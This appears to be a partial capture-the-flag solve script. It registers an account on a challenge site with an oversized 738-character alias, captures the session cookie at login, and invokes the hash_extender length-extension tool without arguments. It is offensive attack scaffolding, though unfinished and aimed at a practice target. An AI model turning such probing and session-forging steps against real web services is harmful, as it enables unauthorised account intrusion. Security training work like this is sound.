import pycurl
import re
import os
from urllib.parse import urlencode
from functions import timeout_command_ex

URL_REGISTER = 'http://stickitup.chall.malicecyber.com/register.php'
URL_LOGIN = 'http://stickitup.chall.malicecyber.com/login.php'
BINPATH = './bin/macos/'

SESSION = ''

def _write_header1(header):
    global SESSION
    match = re.match("^Set-Cookie: (.*)$", header.decode('utf-8'))
    if match:
        SESSION = match.group(1)
        #ret = match.group(1)[10:].split(';')[0]
        print("Register Cookie: {}".format(SESSION))

def _write_header2(header):
    match = re.match("^Set-Cookie: (.*)$", header.decode('utf-8'))
    if match:
        ret = match.group(1)[10:].split(';')[0]
        print(ret)

MAXLEN = 738

USERARR  = ['A']*MAXLEN
USERNAME = "".join(USERARR)

print("Register Size: {}".format(MAXLEN))
print("Register Username: {}".format(USERNAME))
params = {
    'alias': USERNAME,
    'email': 'aaaaaaaaaaaa@b.com',
    'password': 'aaaa'
}
c = pycurl.Curl() 
c.setopt(pycurl.URL, URL_REGISTER + '?' + urlencode(params))
c.setopt(pycurl.FOLLOWLOCATION, 1 )
c.setopt(pycurl.HEADERFUNCTION, _write_header1)
c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
c.setopt(pycurl.HTTPHEADER, [
    'Accept-Language: fr-fr', 
    'Upgrade-Insecure-Requests: 1', 
    'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 
    'Content-Type: application/x-www-form-urlencoded',
    'X-Requested-With: XMLHttpRequest'
])
c.perform() 
status = c.getinfo(pycurl.HTTP_CODE)
print("Register Status: {}".format(status)) 

print("Login Size: {}".format(MAXLEN))
params = {
    'email': 'aaaaaaaaaaaa@b.com',
    'password': 'aaaa'
}
c.setopt(pycurl.URL, URL_LOGIN + '?' + urlencode(params))
c.setopt(pycurl.FOLLOWLOCATION, 1 )
c.setopt(pycurl.HEADERFUNCTION, _write_header2)
c.setopt(pycurl.HTTPHEADER, [
    'Accept-Language: fr-fr', 
    'Upgrade-Insecure-Requests: 1', 
    'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 
    'Content-Type: application/x-www-form-urlencoded',
    'X-Requested-With: XMLHttpRequest',
    'Set-Cookie: ' + SESSION
])
c.perform()
status = c.getinfo(pycurl.HTTP_CODE)
print("Login Status: {}".format(status)) 
c.close()

cmd = [
    os.path.join(BINPATH, 'hash_extender')
]

print(cmd)
_, ret, data = timeout_command_ex(cmd, 10)
print("ret: {}, data: {}".format(ret, data))